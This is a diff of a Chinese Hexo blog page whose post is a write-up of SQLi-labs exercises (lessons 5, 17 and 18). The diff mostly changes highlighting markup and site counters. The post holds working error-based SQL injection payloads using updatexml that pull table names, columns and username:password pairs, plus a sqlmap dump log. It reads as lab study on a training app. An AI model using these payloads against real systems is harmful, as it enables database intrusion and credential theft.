@@ -120,6 +120,21 @@
     <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
 
   </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
         <li class="menu-item menu-item-archives">
 
     <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
@@ -273,16 +288,16 @@
 </li>
 </ul>
 <h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>也可以使用<strong>报错注入</strong>。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/Less-5/?id=1&#x27; or updatexml(1,concat(0x7e,database(),0x7e),1) %23</span><br></pre></td></tr></table></figure>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">http</span>://localhost/Less-<span class="number">5</span>/?id=<span class="number">1</span>&#x27; or updatexml(<span class="number">1</span>,concat(<span class="number">0</span>x7e,database(),<span class="number">0</span>x7e),<span class="number">1</span>) %<span class="number">23</span></span><br></pre></td></tr></table></figure>
 
 <p>回显<code>XPATH syntax error: &#39;~security~&#39;</code></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/Less-5/?id=1&#x27; or updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),0x7e),1) %23</span><br></pre></td></tr></table></figure>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">http</span>://localhost/Less-<span class="number">5</span>/?id=<span class="number">1</span>&#x27; or updatexml(<span class="number">1</span>,concat(<span class="number">0</span>x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),<span class="number">0</span>x7e),<span class="number">1</span>) %<span class="number">23</span></span><br></pre></td></tr></table></figure>
 
 <p>回显<code>XPATH syntax error: &#39;~emails,referers,uagents,users~&#39;</code></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/Less-5/?id=1&#x27; or updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&quot;users&quot; and table_schema=database()),0x7e),1) %23</span><br></pre></td></tr></table></figure>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">http</span>://localhost/Less-<span class="number">5</span>/?id=<span class="number">1</span>&#x27; or updatexml(<span class="number">1</span>,concat(<span class="number">0</span>x7e,(select group_concat(column_name) from information_schema.columns where table_name=<span class="string">&quot;users&quot;</span> and table_schema=database()),<span class="number">0</span>x7e),<span class="number">1</span>) %<span class="number">23</span></span><br></pre></td></tr></table></figure>
 
 <p>回显<code>XPATH syntax error: &#39;~id,username,password~&#39;</code></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/Less-5/?id=1&#x27; or updatexml(1,concat(0x7e,substr((select group_concat(concat(username,&#x27;:&#x27;,password)) FROM users),1,32),0x7e),1) %23</span><br></pre></td></tr></table></figure>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">http</span>://localhost/Less-<span class="number">5</span>/?id=<span class="number">1</span>&#x27; or updatexml(<span class="number">1</span>,concat(<span class="number">0</span>x7e,substr((select group_concat(concat(username,&#x27;:&#x27;,password)) FROM users),<span class="number">1</span>,<span class="number">32</span>),<span class="number">0</span>x7e),<span class="number">1</span>) %<span class="number">23</span></span><br></pre></td></tr></table></figure>
 
 
 <h2 id="less-6"><a href="#less-6" class="headerlink" title="less-6"></a>less-6</h2><p>同less-5,闭合方式不同。</p>
@@ -300,25 +315,25 @@
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$update</span>=<span class="string">&quot;UPDATE users SET password = &#x27;<span class="subst">$passwd</span>&#x27; WHERE username=&#x27;<span class="subst">$row1</span>&#x27;&quot;</span>;</span><br></pre></td></tr></table></figure>
 
 <p><strong>爆表名</strong>：<br>payload为：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">passwd=admin&#x27; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),0x7e),1) %23&amp;submit=Submit&amp;uname=admin</span><br></pre></td></tr></table></figure>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">passwd</span>=admin&#x27; <span class="keyword">and</span> updatexml(1,concat(0x7e,(select group_concat(table_name) <span class="keyword">from</span> information_schema.tables where <span class="attribute">table_schema</span>=<span class="string">&#x27;security&#x27;</span>),0x7e),1) %23&amp;<span class="attribute">submit</span>=Submit&amp;uname=admin</span><br></pre></td></tr></table></figure>
 
 <p>时总是报错为：<code>Truncated incorrect DOUBLE value: &#39;admin&#39;</code>。<strong>这是因为<code>updatexml()</code>会返回布尔值为double类型，同时会把前面的admin强转为double失败导致报错。</strong><br>改为<code>1&#39;</code>:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">passwd=1&#x27; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),0x7e),1) %23&amp;submit=Submit&amp;uname=admin</span><br></pre></td></tr></table></figure>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">passwd</span>=1&#x27; <span class="keyword">and</span> updatexml(1,concat(0x7e,(select group_concat(table_name) <span class="keyword">from</span> information_schema.tables where <span class="attribute">table_schema</span>=<span class="string">&#x27;security&#x27;</span>),0x7e),1) %23&amp;<span class="attribute">submit</span>=Submit&amp;uname=admin</span><br></pre></td></tr></table></figure>
 
 <p>则是成功的。<br><strong>爆字段</strong>：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">passwd=1&#x27; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&quot;users&quot; and table_schema=&#x27;security&#x27;),0x7e),1) %23&amp;submit=Submit&amp;uname=admin</span><br></pre></td></tr></table></figure>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">passwd</span>=1&#x27; <span class="keyword">and</span> updatexml(1,concat(0x7e,(select group_concat(column_name) <span class="keyword">from</span> information_schema.columns where <span class="attribute">table_name</span>=<span class="string">&quot;users&quot;</span> <span class="keyword">and</span> <span class="attribute">table_schema</span>=<span class="string">&#x27;security&#x27;</span>),0x7e),1) %23&amp;<span class="attribute">submit</span>=Submit&amp;uname=admin</span><br></pre></td></tr></table></figure>
 
 <p><strong>爆数据</strong>：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">passwd=1&#x27; and updatexml(1,concat(0x7e,(select concat(password,&#x27;:&#x27;,username) from users),0x7e),1) %23&amp;submit=Submit&amp;uname=admin</span><br></pre></td></tr></table></figure>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">passwd</span>=<span class="number">1</span>&#x27; and updatexml(<span class="number">1</span>,concat(<span class="number">0</span>x7e,(select concat(password,&#x27;:&#x27;,username) from users),<span class="number">0</span>x7e),<span class="number">1</span>) %<span class="number">23</span>&amp;submit=Submit&amp;uname=admin</span><br></pre></td></tr></table></figure>
 
 <p>此时会抛出错误：<code>You can&#39;t specify target table &#39;users&#39; for update in FROM clause</code>这是因为在原语句中已经正在使用这张表了，而子查询中的<code>SELECT ... FROM users</code>也引用了同一张表，导致MySQL拒绝执行。<br><strong>此时只需要用AS大法即可！</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">passwd=1&#x27; and updatexml(1,concat(0x7e,(select group_concat(concat(password,&#x27;:&#x27;,username)) from (select * from users) AS a),0x7e),1) %23&amp;submit=Submit&amp;uname=admin</span><br></pre></td></tr></table></figure>
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">passwd=1&#x27; and updatexml(1,concat(0x7e,(<span class="keyword">select</span> group_concat(concat(<span class="keyword">password</span>,<span class="string">&#x27;:&#x27;</span>,username)) <span class="keyword">from</span> (<span class="keyword">select</span> * <span class="keyword">from</span> users) <span class="keyword">AS</span> a),<span class="number">0x7e</span>),<span class="number">1</span>) %<span class="number">23</span>&amp;submit=Submit&amp;uname=admin</span><br></pre></td></tr></table></figure>
 
 <p><strong>但是会发现显示不全</strong>。这时就应该用相关函数分段显示了，substr(), mid(),left(), right()……等都可以。<br>示例：</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,substr((<span class="keyword">select</span> group_concat(concat(username,<span class="string">&#x27;:&#x27;</span>,password)) <span class="keyword">FROM</span> (<span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users) <span class="keyword">AS</span> a),<span class="number">1</span>,<span class="number">32</span>),<span class="number">0x7e</span>),<span class="number">1</span>) <span class="operator">%</span><span class="number">23</span></span><br></pre></td></tr></table></figure>
 
 <p>我尝试了用sqlmap来dump下来less-17的users表，但是失败了，这是为什么？（不太清楚,要么是无数据，要么是空表）</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">[18:28:38] [INFO] adjusting time delay to 2 seconds due to good response times</span><br><span class="line">3</span><br><span class="line">Database: security</span><br><span class="line">Table: users</span><br><span class="line">[13 entries]</span><br><span class="line">+------+----------+----------+</span><br><span class="line">| id   | password | username |</span><br><span class="line">+------+----------+----------+</span><br><span class="line">| NULL | NULL     | NULL     |</span><br><span class="line">| NULL | NULL     | NULL     |</span><br><span class="line">| NULL | NULL     | NULL     |</span><br><span class="line">| NULL | NULL     | NULL     |</span><br><span class="line">| NULL | NULL     | NULL     |</span><br><span class="line">| NULL | NULL     | NULL     |</span><br><span class="line">| NULL | NULL     | NULL     |</span><br><span class="line">| NULL | NULL     | NULL     |</span><br><span class="line">| NULL | NULL     | NULL     |</span><br><span class="line">| NULL | NULL     | NULL     |</span><br><span class="line">| NULL | NULL     | NULL     |</span><br><span class="line">| NULL | NULL     | NULL     |</span><br><span class="line">| NULL | NULL     | NULL     |</span><br><span class="line">+------+----------+----------+</span><br><span class="line"></span><br><span class="line">[18:28:41] [INFO] table &#x27;`security`.users&#x27; dumped to CSV file &#x27;C:\Users\Lenovo\AppData\Local\sqlmap\output\127.0.0.1\dump\security\users.csv&#x27;</span><br><span class="line">[18:28:41] [INFO] fetched data logged to text files under &#x27;C:\Users\Lenovo\AppData\Local\sqlmap\output\127.0.0.1&#x27;</span><br><span class="line"></span><br><span class="line">[*] ending @ 18:28:41 /2025-03-16/</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">E:\myCTFTools\WebTools\sqlmap&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">[18:28:38] [INFO] adjusting time delay to 2 seconds due to good response times</span><br><span class="line">3</span><br><span class="line">Database: security</span><br><span class="line">Table: users</span><br><span class="line">[13 entries]</span><br><span class="line">+------+----------+----------+</span><br><span class="line">|<span class="string"> id   </span>|<span class="string"> password </span>|<span class="string"> username </span>|</span><br><span class="line">+------+----------+----------+</span><br><span class="line">|<span class="string"> NULL </span>|<span class="string"> NULL     </span>|<span class="string"> NULL     </span>|</span><br><span class="line">|<span class="string"> NULL </span>|<span class="string"> NULL     </span>|<span class="string"> NULL     </span>|</span><br><span class="line">|<span class="string"> NULL </span>|<span class="string"> NULL     </span>|<span class="string"> NULL     </span>|</span><br><span class="line">|<span class="string"> NULL </span>|<span class="string"> NULL     </span>|<span class="string"> NULL     </span>|</span><br><span class="line">|<span class="string"> NULL </span>|<span class="string"> NULL     </span>|<span class="string"> NULL     </span>|</span><br><span class="line">|<span class="string"> NULL </span>|<span class="string"> NULL     </span>|<span class="string"> NULL     </span>|</span><br><span class="line">|<span class="string"> NULL </span>|<span class="string"> NULL     </span>|<span class="string"> NULL     </span>|</span><br><span class="line">|<span class="string"> NULL </span>|<span class="string"> NULL     </span>|<span class="string"> NULL     </span>|</span><br><span class="line">|<span class="string"> NULL </span>|<span class="string"> NULL     </span>|<span class="string"> NULL     </span>|</span><br><span class="line">|<span class="string"> NULL </span>|<span class="string"> NULL     </span>|<span class="string"> NULL     </span>|</span><br><span class="line">|<span class="string"> NULL </span>|<span class="string"> NULL     </span>|<span class="string"> NULL     </span>|</span><br><span class="line">|<span class="string"> NULL </span>|<span class="string"> NULL     </span>|<span class="string"> NULL     </span>|</span><br><span class="line">|<span class="string"> NULL </span>|<span class="string"> NULL     </span>|<span class="string"> NULL     </span>|</span><br><span class="line">+------+----------+----------+</span><br><span class="line"></span><br><span class="line">[18:28:41] [INFO] table &#x27;`security`.users&#x27; dumped to CSV file &#x27;C:\Users\Lenovo\AppData\Local\sqlmap\output\127.0.0.1\dump\security\users.csv&#x27;</span><br><span class="line">[18:28:41] [INFO] fetched data logged to text files under &#x27;C:\Users\Lenovo\AppData\Local\sqlmap\output\127.0.0.1&#x27;</span><br><span class="line"></span><br><span class="line">[<span class="symbol">*</span>] ending @ 18:28:41 /2025-03-16/</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">E:\myCTFTools\WebTools\sqlmap&gt;</span><br></pre></td></tr></table></figure>
 
 <h1 id="less-18-报错，延时盲注-User-Agent注入点"><a href="#less-18-报错，延时盲注-User-Agent注入点" class="headerlink" title="less-18(报错，延时盲注 User-Agent注入点)"></a>less-18(报错，延时盲注 User-Agent注入点)</h1><p>PHP 里用来获取客户端 IP 的变量												</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_CLIENT_IP&#x27;</span>] <span class="comment">#这个很少使用，不一定服务器都实现了。客户端可以伪造。</span></span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>] <span class="comment">#客户端可以伪造。</span></span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] <span class="comment">#客户端不能伪造。</span></span><br></pre></td></tr></table></figure>
@@ -430,18 +445,20 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">15</span>
+          <span class="site-state-item-count">14</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
-        <span class="site-state-item-count">3</span>
+          
+        <span class="site-state-item-count">2</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
-        <span class="site-state-item-count">17</span>
+          
+        <span class="site-state-item-count">16</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
@@ -477,12 +494,12 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-area"></i>
     </span>
-    <span title="站点总字数">48k</span>
+    <span title="站点总字数">45k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">43 分钟</span>
+    <span title="站点阅读时长">41 分钟</span>
 </div>
   <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
   </div>
